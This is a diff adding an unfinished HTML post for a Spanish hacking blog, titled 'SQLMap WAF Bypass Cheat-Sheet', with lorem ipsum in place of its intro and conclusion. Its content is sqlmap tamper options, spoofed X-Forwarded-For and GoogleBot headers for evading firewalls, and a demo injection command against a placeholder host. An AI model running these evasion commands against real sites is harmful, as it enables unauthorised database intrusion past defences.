@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <title><!-- Título del post --> | 0xH4CK</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="../../styles/post.css" />
+</head>
+
+
+
+<body>
+
+  <!-- Atajo flotante -->
+  <a class="back" href="../../index.html">&lt; home</a>
+
+  <!-- Contenido del post -->
+  <article>
+    <header>
+      <h1>SQLMap WAF Bypass Cheat-Sheet</h1>
+      <p class="meta">2025-08-10 | M4vixs</p>
+    </header>
+
+    <h2>Intro</h2>
+    <p>
+      Lorem ipsum dolor sit amet consectetur adipisicing elit. Quidem vel assumenda et consequatur similique dolore at illo aliquid quibusdam ut. Aspernatur voluptate animi magnam ipsam neque, quibusdam hic officia asperiores.
+    </p>
+
+    <h2>Prerequisites</h2>
+    <ul>
+      <li>sqlmap ≥ 1.7</li>
+      <li>Conocer la query vulnerable</li>
+      <li>Whitelist de IP (opcional)</li>
+    </ul>
+
+    <h3>1. Tamper scripts útiles</h3>
+    <pre>--tamper=space2comment,charencode,randomcase</pre>
+
+    <h3>2. Headers que engañan</h3>
+    <pre>--headers="X-Forwarded-For: 127.0.0.1\nUser-Agent: GoogleBot"</pre>
+
+    <h2>Demo</h2>
+    <pre>sqlmap -u "https://vuln.site/search?q=test" \
+  --batch --threads=5 --tamper=space2comment \
+  --level 3 --risk 2</pre>
+
+    <h2>Conclusion</h2>
+    <p>
+      Lorem ipsum dolor sit amet consectetur adipisicing elit. Deleniti optio cumque eligendi natus magni commodi! Blanditiis totam alias sapiente quod, sequi voluptas, adipisci veritatis nemo voluptate tempora eius nisi, pariatur incidunt fuga fugiat nobis minima rem accusamus consequuntur suscipit ab?
+    </p>
+
+
+
+
+  </article>
+
+</body>
+
+</html>
